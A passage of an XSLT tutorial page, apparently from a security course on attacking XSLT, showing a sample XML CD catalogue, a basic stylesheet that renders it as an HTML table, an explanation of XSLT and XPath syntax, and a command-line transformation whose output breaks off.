    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Gary Moore<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>UK<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Virgin records<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>10.20<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1990<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Eros<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Eros Ramazzotti<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>EU<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>BMG<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>9.90<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1997<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>One night only<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Bee Gees<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>UK<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Polydor<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>10.90<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1998<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Sylvias Mother<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Dr.Hook<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>UK<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>CBS<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>8.10<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1973<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Maggie May<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Rod Stewart<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>UK<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Pickwick<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>8.50<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1990<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Romanza<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Andrea Bocelli<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>EU<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Polydor<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>10.80<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1996<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>When a man loves a woman<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Percy Sledge<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>USA<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Atlantic<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>8.70<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1987<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Black angel<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Savage Rose<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>EU<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Mega<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>10.90<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1995<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>1999 Grammy Nominees<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Many<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>USA<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Grammy<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>10.20<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1999<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>For the good times<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Kenny Rogers<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>UK<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Mucik Master<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>8.70<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1995<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Big Willie style<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Will Smith<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>USA<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Columbia<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>9.90<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1997<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Tupelo Honey<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Van Morrison<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>UK<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Polydor<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>8.20<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1971<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Soulsville<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Jorn Hoel<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>Norway<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>WEA<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>7.90<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1996<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>The very best of<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Cat Stevens<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>UK<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Island<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>8.90<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1990<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Stop<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Sam Brown<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>UK<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>A and M<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>8.90<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1988<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Bridge of Spies<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>T`Pau<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>UK<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Siren<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>7.90<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1987<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Private Dancer<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Tina Turner<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>UK<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Capitol<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>8.90<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1983<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Midt om natten<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Kim Larsen<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>EU<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Medley<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>7.80<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1983<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Pavarotti Gala Concert<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Luciano Pavarotti<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>UK<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>DECCA<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>9.90<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1991<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>The dock of the bay<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Otis Redding<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>USA<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Stax Records<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>7.90<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1968<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Picture book<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Simply Red<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>EU<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Elektra<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>7.20<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1985<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Red<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>The Communards<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>UK<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>London<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>7.80<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1987<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Unchain my heart<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Joe Cocker<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>USA<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>EMI<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>8.20<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1987<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">catalog</span>&gt;</span>
</code></pre>
<p><strong>transformation.xsl</strong></p>
<p>Code: xml</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"1.0"</span>
<span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">"/"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>My CD Collection<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">"1"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">"#9acd32"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Artist<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">"catalog/cd/title"</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">"catalog/cd/artist"</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span>
</code></pre>
<p>We need to understand the XSLT format to see how the transformation works.</p>
<ul>
<li>The first line is usually the XML version and encoding</li>
<li>Next, it will have the XSL root node <code>xsl:stylesheet</code></li>
<li>Then, we will have the directives in <code>xsl:template match=&quot;&lt;PATH&gt;&quot;</code>. In this case, it will apply to any XML node.</li>
<li>After that, the transformation is defined for any item in the XML structure matching the previous line.</li>
<li>To select certain items from the XML document, XPATH language is used in the form of <code>&lt;xsl:value-of select=&quot;&lt;NODE&gt;/&lt;SUBNODE&gt;/&lt;VALUE&gt;&quot;/&gt;</code>.</li>
</ul>
<p>To see the results, we will use the command line parser. This can be done as follows:</p>
<p><strong>Transformation through the terminal</strong></p>
<p>Attacking XSLT</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ saxonb-xslt -xsl:transformation.xsl catalogue.xml

Warning: at xsl:stylesheet on line 3 column 50 of transformation.xslt:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>My CD Collection<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">"1"</span>&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">"#9acd32"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
